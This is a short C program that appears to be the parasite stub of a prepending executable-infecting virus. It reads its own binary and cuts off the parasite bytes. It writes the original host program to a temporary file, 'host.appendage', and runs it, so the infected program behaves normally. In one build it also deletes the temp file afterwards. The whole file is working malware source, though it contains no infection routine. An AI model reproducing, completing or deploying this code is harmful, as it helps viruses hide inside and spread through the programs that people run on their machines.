#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define PARASITE_LENGTH		5462
#define TMP_FILENAME		"host.appendage"

#ifdef DEBUG
 #define die(X)	{ printf(X"\n"); exit(1); }
#else
 #define die(X) exit(1)
#endif

int main(int argc, char *argv[], char *envp[])
{
	int fd, out;
	struct stat stat;
	char *data;
	int len;

	printf("PARASITE\n");

	fd = open(argv[0], O_RDONLY);
	if (fd < 0) die("open(fd)");
	if (fstat(fd, &stat) < 0) die("fstat");
	len = stat.st_size - PARASITE_LENGTH;
	data = malloc(len);
	if (data == NULL) die("malloc");
	if (lseek(fd, PARASITE_LENGTH, SEEK_SET) != PARASITE_LENGTH)
		die("lseek(fd)");
	if (read(fd, data, len) != len) die("read(fd)");	
	close(fd);
	out = open(TMP_FILENAME, O_RDWR | O_CREAT | O_TRUNC, stat.st_mode);
	if (out < 0) die("open(out)");
	if (write(out, data, len) != len) die("write(out)");
	free(data);
	close(out);

#ifdef USE_FORK
	len = fork();
	if (len < 0) die("fork");
	if (len == 0) {
		exit(execve(TMP_FILENAME, argv, envp));
	}
	if (waitpid(len, NULL, 0) != len) die("waitpid");
	unlink(TMP_FILENAME);
	exit(0);
#else
	exit(execve(TMP_FILENAME, argv, envp));
#endif
}
